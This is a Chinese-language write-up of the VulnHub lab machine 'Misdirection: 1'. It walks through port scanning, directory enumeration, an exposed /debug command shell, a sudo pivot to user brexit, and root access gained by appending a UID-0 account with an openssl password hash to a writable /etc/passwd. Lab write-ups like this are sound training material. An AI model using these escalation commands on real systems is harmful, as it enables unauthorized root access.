# Misdirection: 1

2024-6-12 https://www.vulnhub.com/entry/misdirection-1,371/

difficulty: Easy

## IP

192.168.10.196

## Scan

Open Port -> 22,80,3306,8080

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 ecbb44eef333af9fa5ceb5776145e436 (RSA)
|   256 677bcb4e951b78088d2ab147048d6287 (ECDSA)
|_  256 59041d25116d89a36c6de4e3d23cda7d (ED25519)
80/tcp   open  http    Rocket httpd 1.2.6 (Python 2.7.15rc1)
|_http-server-header: Rocket 1.2.6 Python/2.7.15rc1
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
3306/tcp open  mysql   MySQL (unauthorized)
8080/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
```

优先看 80 和 8080 对应的 web 服务。

80 对应的显示了一个 cms,底部显示的是 web2py，经过 searchsploit 搜索，存在多个漏洞:

```
Web2py 2.14.5 - Multiple Vulnerabilities | python/webapps/39821.txt

http://192.168.10.196/admin/  显示: 管理因不安全通道而关闭
```

80 的整个子页面除了 /example 都无法访问，应该是后台做了限制，所以上面的漏洞也无法进行利用。

在看 8080 端口，gobuster 扫描一下：

```
gobuster -t 32 dir -u http://192.168.10.196:8080/ -k -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,txt,html,rar,zip,sql -e

http://192.168.10.196:8080/help                 (Status: 301) [Size: 322] [--> http://192.168.10.196:8080/help/]
http://192.168.10.196:8080/index.html           (Status: 200) [Size: 10918]
http://192.168.10.196:8080/images               (Status: 301) [Size: 324] [--> http://192.168.10.196:8080/images/]
http://192.168.10.196:8080/scripts              (Status: 301) [Size: 325] [--> http://192.168.10.196:8080/scripts/]
http://192.168.10.196:8080/css                  (Status: 301) [Size: 321] [--> http://192.168.10.196:8080/css/]
http://192.168.10.196:8080/wordpress            (Status: 301) [Size: 327] [--> http://192.168.10.196:8080/wordpress/]
http://192.168.10.196:8080/development          (Status: 301) [Size: 329] [--> http://192.168.10.196:8080/development/]
http://192.168.10.196:8080/manual               (Status: 301) [Size: 324] [--> http://192.168.10.196:8080/manual/]
http://192.168.10.196:8080/js                   (Status: 301) [Size: 320] [--> http://192.168.10.196:8080/js/]
http://192.168.10.196:8080/shell                (Status: 301) [Size: 323] [--> http://192.168.10.196:8080/shell/]
http://192.168.10.196:8080/debug                (Status: 301) [Size: 323] [--> http://192.168.10.196:8080/debug/]
```

http://192.168.10.196:8080/debug/ 直接显示了一个可以执行 linux 命令的 web 窗口，sudo -l 显示可以切换到用户 brexit:

```
www-data@misdirection:/home$ sudo -l
Matching Defaults entries for www-data on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on localhost:
    (brexit) NOPASSWD: /bin/bash
```

sudo -u brexit /bin/bash

得到 user flag:

```
brexit@misdirection:~$ cat user.txt
404b9193154be7fbbc56d7534cb26339
```

sudo、suid、crontab、getcap 等都没有提权点，在查询可写权限文件时，发现可对/etc/passwd 进行修改：

```
find / -writable -type f 2>/dev/null | grep -v '/sys' | grep -v '/proc'| grep -v '/home/brexit/web2py'
```

所以直接可以新创建一个 root 权限用户密码为 123，加到 /etc/passwd 文件中：

```
openssl passwd -1 -salt new 123
$1$new$p7ptkEKU1HnaHpRtzNizS1

echo 'tom:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:User_like_root:/root:/bin/bash' >> /etc/passwd

brexit@misdirection:~/web2py$ su tom
Password:
root@misdirection:/home/brexit/web2py# cd /root
root@misdirection:~# ls -al
total 60
drwx------  6 root root  4096 Sep 24  2019 .
drwxr-xr-x 23 root root  4096 Jun  1  2019 ..
-r--------  1 root root    33 Jun  1  2019 root.txt

root@misdirection:~# cat root.txt
0d2c6222bfdd3701e0fa12a9a9dc9c8c
```

最终获得了 root 权限。
